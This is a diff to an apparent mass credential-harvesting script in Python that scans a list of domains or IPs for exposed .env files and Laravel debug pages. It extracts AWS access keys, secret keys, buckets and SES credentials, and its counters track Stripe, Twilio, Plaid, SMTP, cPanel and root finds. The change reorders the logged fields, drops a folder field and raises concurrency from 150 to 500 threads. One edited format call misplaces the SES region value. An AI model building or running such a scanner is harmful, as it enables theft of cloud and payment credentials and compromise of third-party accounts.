@@ -771,8 +771,8 @@ def GET_SMTP(SRC_, URL_, METHOD_):
 
 def GET_AWS_KEY(SRC_, URL_, METHOD_):
 	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
-	AWS_DEFAULT_REGION = ""; AWS_BUCKET = ""; AWS_ACCESS_KEY_ID = ""; AWS_SECRET_ACCESS_KEY = ""; AWS_FOLDER_NAME = ""; SES_KEY = ""; SES_SECRET = ""; SES_REGION = "";
-	TEMP = "URL: {}\nMETHOD: {}\nAWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nAWS_ACCESS_KEY_ID: {}\nAWS_SECRET_ACCESS_KEY: {}\nAWS_FOLDER_NAME: {}\nSES_KEY: {}\nSES_SECRET: {}\nSES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, SES_REGION, AWS_BUCKET, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_FOLDER_NAME, SES_KEY, SES_SECRET, SES_REGION)
+	AWS_ACCESS_KEY_ID = ""; AWS_SECRET_ACCESS_KEY = ""; AWS_DEFAULT_REGION = ""; AWS_BUCKET = ""; SES_KEY = ""; SES_SECRET = ""; SES_REGION = "";
+	TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nSES_KEY: {}|SES_SECRET: {}|SES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET, SES_KEY, SES_SECRET, SES_REGION)
 	# ////////////////////////////////////////////////////////////////
 	if METHOD_ == "[/.ENV]":
 		if "AWS_ACCESS_KEY_ID" in SRC_ or "AWS_SECRET_ACCESS_KEY" in SRC_ or "SES_KEY" in SRC_:
@@ -784,9 +784,7 @@ def GET_AWS_KEY(SRC_, URL_, METHOD_):
 			if "AWS_ACCESS_KEY_ID =" in SRC_: AWS_ACCESS_KEY_ID = SRC_.split("AWS_ACCESS_KEY_ID =")[1].split("\n")[0]
 			if "AWS_SECRET_ACCESS_KEY=" in SRC_: AWS_SECRET_ACCESS_KEY = SRC_.split("AWS_SECRET_ACCESS_KEY=")[1].split("\n")[0]
 			if "AWS_SECRET_ACCESS_KEY =" in SRC_: AWS_SECRET_ACCESS_KEY = SRC_.split("AWS_SECRET_ACCESS_KEY =")[1].split("\n")[0]
-			if "AWS_FOLDER_NAME=" in SRC_: AWS_FOLDER_NAME = SRC_.split("AWS_FOLDER_NAME=")[1].split("\n")[0]
-			if "AWS_FOLDER_NAME =" in SRC_: AWS_FOLDER_NAME = SRC_.split("AWS_FOLDER_NAME =")[1].split("\n")[0]
-			TEMP = "URL: {}\nMETHOD: {}\nAWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nAWS_ACCESS_KEY_ID: {}\nAWS_SECRET_ACCESS_KEY: {}\nAWS_FOLDER_NAME: {}\n===================================\n\n".format(URL_, METHOD_, AWS_DEFAULT_REGION, AWS_BUCKET, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_FOLDER_NAME)
+			TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET)
 			if "SES_KEY" in SRC_ or "SES_SECRET" in SRC_:
 				if "SES_KEY=" in SRC_: SES_KEY = SRC_.split("SES_KEY=")[1].split("\n")[0]
 				if "SES_KEY =" in SRC_: SES_KEY = SRC_.split("SES_KEY =")[1].split("\n")[0]
@@ -794,7 +792,7 @@ def GET_AWS_KEY(SRC_, URL_, METHOD_):
 				if "SES_SECRET =" in SRC_: SES_SECRET = SRC_.split("SES_SECRET =")[1].split("\n")[0]
 				if "SES_REGION=" in SRC_: SES_REGION = SRC_.split("SES_REGION=")[1].split("\n")[0]
 				if "SES_REGION =" in SRC_: SES_REGION = SRC_.split("SES_REGION =")[1].split("\n")[0]
-				TEMP = "URL: {}\nMETHOD: {}\nAWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nAWS_ACCESS_KEY_ID: {}\nAWS_SECRET_ACCESS_KEY: {}\nAWS_FOLDER_NAME: {}\nSES_KEY: {}\nSES_SECRET: {}\nSES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, SES_REGION, AWS_BUCKET, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_FOLDER_NAME, SES_KEY, SES_SECRET, SES_REGION)
+				TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nSES_KEY: {}|SES_SECRET: {}|SES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, SES_REGION, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET, SES_KEY, SES_SECRET, SES_REGION)
 			else:
 				pass
 		else:
@@ -813,10 +811,7 @@ def GET_AWS_KEY(SRC_, URL_, METHOD_):
 			try:
 				if "AWS_SECRET_ACCESS_KEY" in SRC_: AWS_SECRET_ACCESS_KEY = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
 			except: pass
-			try:
-				if "AWS_FOLDER_NAME" in SRC_: AWS_FOLDER_NAME = reg('<td>AWS_FOLDER_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
-			except: pass
-			TEMP = "URL: {}\nMETHOD: {}\nAWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nAWS_ACCESS_KEY_ID: {}\nAWS_SECRET_ACCESS_KEY: {}\nAWS_FOLDER_NAME: {}\n===================================\n\n".format(URL_, METHOD_, AWS_DEFAULT_REGION, AWS_BUCKET, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_FOLDER_NAME)
+			TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET)
 			if "<td>SES_KEY</td>" in SRC_:
 				try:
 					if "SES_KEY" in SRC_: SES_KEY = reg('<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
@@ -827,7 +822,7 @@ def GET_AWS_KEY(SRC_, URL_, METHOD_):
 				try:
 					if "SES_REGION" in SRC_: SES_REGION = reg('<td>SES_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
 				except: pass
-				TEMP = "URL: {}\nMETHOD: {}\nAWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nAWS_ACCESS_KEY_ID: {}\nAWS_SECRET_ACCESS_KEY: {}\nAWS_FOLDER_NAME: {}\nSES_KEY: {}\nSES_SECRET: {}\nSES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, SES_REGION, AWS_BUCKET, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_FOLDER_NAME, SES_KEY, SES_SECRET, SES_REGION)
+				TEMP = "URL: {}\nMETHOD: {}\nAWS_ACCESS_KEY_ID: {}|AWS_SECRET_ACCESS_KEY: {}|AWS_DEFAULT_REGION: {}\nAWS_BUCKET: {}\nSES_KEY: {}|SES_SECRET: {}|SES_REGION: {}\n===================================\n\n".format(URL_, METHOD_, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_BUCKET, SES_KEY, SES_SECRET, SES_REGION)
 			else:
 				pass
 	else:
@@ -949,6 +944,6 @@ XINO = open(raw_input("Domains/IPS ? "), "r").read().split("\n")
 #	CHECK(Q8)
 
 if __name__ == '__main__':
-	pool = ThreadPool(150)
+	pool = ThreadPool(500)
 	for _ in pool.imap_unordered(CHECK, XINO):
 		pass
